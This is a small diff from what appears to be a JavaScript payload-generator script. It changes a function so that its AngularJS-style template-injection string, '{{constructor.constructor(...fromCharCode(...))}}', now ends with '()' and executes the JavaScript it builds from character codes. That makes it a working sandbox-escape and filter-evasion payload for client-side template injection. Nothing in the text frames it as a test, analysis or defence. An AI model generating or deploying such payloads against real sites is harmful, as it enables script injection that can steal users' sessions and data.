@@ -79,7 +79,7 @@ function hard (str) {
 }
 
 function soft (str) {
-  return '{{constructor.constructor((false+[]).fromCharCode(' + (str.split('').map((o) => o.charCodeAt(0))) + '))}}'
+  return '{{constructor.constructor((false+[]).fromCharCode(' + (str.split('').map((o) => o.charCodeAt(0))) + '))()}}'
 }
 
 if (args._[0]) {
